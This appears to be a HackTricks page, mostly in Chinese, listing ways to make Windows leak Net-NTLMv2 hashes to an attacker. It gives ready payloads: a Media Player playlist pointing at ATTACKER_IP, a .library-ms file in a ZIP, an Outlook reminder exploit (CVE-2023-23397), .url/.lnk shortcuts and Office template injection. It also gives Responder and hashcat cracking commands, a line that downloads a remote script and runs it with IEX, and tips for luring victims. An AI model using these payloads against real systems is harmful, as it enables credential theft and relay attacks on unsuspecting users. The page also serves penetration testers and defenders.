# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**查看来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 的所有精彩想法，从在线下载 Microsoft Word 文件 到 ntlm leaks 源： https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 和 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

如果你能让目标打开或预览你控制的 Windows Media Player 播放列表，通过将条目指向 UNC 路径，你就可以 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取被引用的媒体并进行隐式认证。

示例 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集与破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### 嵌入 ZIP 的 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer 在从 ZIP 存档内部直接打开 .library-ms 文件时存在不安全的处理。 如果库定义指向远程 UNC 路径（例如 \\attacker\share），仅在 ZIP 中浏览/启动该 .library-ms 就会导致 Explorer 枚举该 UNC 并向攻击者发送 NTLM 身份验证。 这会产生一个 NetNTLMv2，可以离线破解或可能被中继。

指向攻击者 UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
操作步骤
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩（在 Windows 上：Send to → Compressed (zipped) folder），并将 ZIP 交付给目标。
- 运行 NTLM 捕获监听器，等待受害者从 ZIP 中打开 .library-ms。


### Outlook 日历提醒声音路径 (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows 在日历项目中处理扩展 MAPI 属性 PidLidReminderFileParameter。如果该属性指向 UNC 路径（例如 \\attacker\share\alert.wav），当提醒触发时 Outlook 会联系 SMB 共享，leaking the user’s Net‑NTLMv2 without any click。该问题在 March 14, 2023 修补，但对于遗留/未更新的设备群以及历史事件响应仍然高度相关。

使用 PowerShell (Outlook COM) 的快速利用：
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 端:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
说明
- 受害者只需在提醒触发时运行 Outlook for Windows 即可。
- 该 leak 生成可用于离线破解或 relay 的 Net‑NTLMv2（不适用于 pass‑the‑hash）。


### .LNK/.URL 基于图标的 zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer 会自动呈现快捷方式图标。近期研究表明，即使在 Microsoft 于 2025 年 4 月为 UNC‑icon 快捷方式发布补丁之后，仍可通过将快捷方式目标托管在 UNC 路径上并将图标保留为本地来触发 NTLM 身份验证而无需点击（该补丁绕过被分配为 CVE‑2025‑50154）。仅查看该文件夹就会导致 Explorer 从远程目标检索元数据，并向攻击者的 SMB 服务器发送 NTLM。

最小的 Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
程序快捷方式 payload (.lnk) 通过 PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 把快捷方式放进 ZIP，然后诱使目标浏览它。
- 将快捷方式放到目标会打开的可写共享上。
- 与同一文件夹中的其他诱饵文件搭配，这样 Explorer 会预览这些项。


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用外部模板。如果你把附带的模板设置为 UNC 路径，打开文档时会向 SMB 进行身份验证。

Minimal DOCX relationship changes (inside word/):

1) 编辑 word/settings.xml 并添加附带的模板引用：
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels 并将 rId1337 指向你的 UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 重新打包为 .docx 并交付。运行你的 SMB capture listener 并等待打开。

有关 post-capture 阶段可用于 relaying 或 abusing NTLM 的思路，请查看：

{{#ref}}
README.md
{{#endref}}


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
